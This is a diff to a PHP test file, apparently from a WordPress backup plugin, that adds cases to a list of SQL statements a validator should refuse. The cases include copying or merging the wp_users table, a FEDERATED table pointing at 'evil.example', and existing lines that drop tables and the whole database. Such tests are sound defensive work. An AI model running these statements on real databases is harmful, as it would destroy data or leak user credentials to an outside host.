@@ -144,6 +144,10 @@ SQL;
 
 	public function refused() {
 		return array(
+			'table filled from another table' => array( "CREATE TABLE `SERVMASK_PREFIX_copy` (\n  `id` int\n) ENGINE=InnoDB SELECT * FROM `wp_users`" ),
+			'table copied as a select'        => array( 'CREATE TABLE `SERVMASK_PREFIX_copy` (`id` int) AS SELECT ID FROM wp_users' ),
+			'merge table over other tables'   => array( "CREATE TABLE `SERVMASK_PREFIX_m` (\n  `id` int\n) ENGINE=MRG_MyISAM UNION=(`wp_users`)" ),
+			'table on a remote server'        => array( "CREATE TABLE `SERVMASK_PREFIX_f` (\n  `id` int\n) ENGINE=FEDERATED CONNECTION='mysql://u:p@evil.example/db/t'" ),
 			'live table'        => array( 'DROP TABLE IF EXISTS `wp_users`' ),
 			'live insert'       => array( "INSERT INTO `wp2_users` VALUES (1,'admin')" ),
 			'whole database'    => array( 'DROP DATABASE wordpress' ),
